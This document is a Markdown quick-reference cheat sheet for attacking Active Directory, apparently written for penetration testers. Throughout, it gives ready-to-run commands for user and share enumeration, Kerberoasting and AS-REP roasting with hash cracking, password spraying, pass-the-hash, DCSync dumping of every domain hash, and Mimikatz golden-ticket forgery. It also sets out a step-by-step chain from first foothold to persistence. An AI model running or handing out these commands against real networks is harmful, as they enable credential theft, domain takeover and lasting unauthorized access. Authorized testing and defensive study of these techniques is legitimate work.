# 🏢 Active Directory Quick Reference

---

## Enumeration

```bash
# From Linux — no creds needed (sometimes)
enum4linux -a IP
crackmapexec smb IP -u '' -p ''

# From Linux — with creds
crackmapexec smb IP -u user -p password --users
crackmapexec smb IP -u user -p password --groups
crackmapexec smb IP -u user -p password --shares
impacket-GetADUsers -all domain.local/user:password -dc-ip IP

# BloodHound data collection (Linux)
bloodhound-python -u user -p password -d domain.local -ns IP -c all

# From Windows
net user /domain
net group "Domain Admins" /domain
whoami /all
```

---

## Kerberoasting

```bash
# Linux
impacket-GetUserSPNs domain.local/user:password -dc-ip IP -request -outputfile kerb.hash

# Crack
hashcat -m 13100 kerb.hash rockyou.txt
```

---

## AS-REP Roasting (no creds needed)

```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -dc-ip IP -outputfile asrep.hash
hashcat -m 18200 asrep.hash rockyou.txt
```

---

## Pass-the-Hash

```bash
crackmapexec smb IP -u administrator -H 'NTLM_HASH'
impacket-psexec -hashes LM:NT administrator@IP
evil-winrm -i IP -u administrator -H 'NTLM_HASH'
```

---

## Password Spraying

```bash
crackmapexec smb IP -u users.txt -p 'Password123' --no-bruteforce
# Look for: [+] = valid, [*] = locked out
```

---

## DCSync (needs DA or DCSync rights)

```bash
impacket-secretsdump domain.local/admin:password@IP -just-dc
impacket-secretsdump domain.local/admin:password@IP -just-dc-user krbtgt
```

---

## Common Attack Chain

```
Password spray → foothold
→ BloodHound → find path to DA
→ Kerberoast / AS-REP roast → crack hash
→ Pass-the-Hash → lateral movement
→ DCSync → dump all hashes
→ Golden ticket → persistence
```

---

## Golden Ticket (Mimikatz)

```
# Need: krbtgt hash + domain SID
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
dir \\dc\c$
```

---

## Key Tools

| Tool | Install |
|------|---------|
| BloodHound | `apt install bloodhound` |
| Impacket | `pip install impacket` |
| CrackMapExec | `apt install crackmapexec` |
| Evil-WinRM | `gem install evil-winrm` |
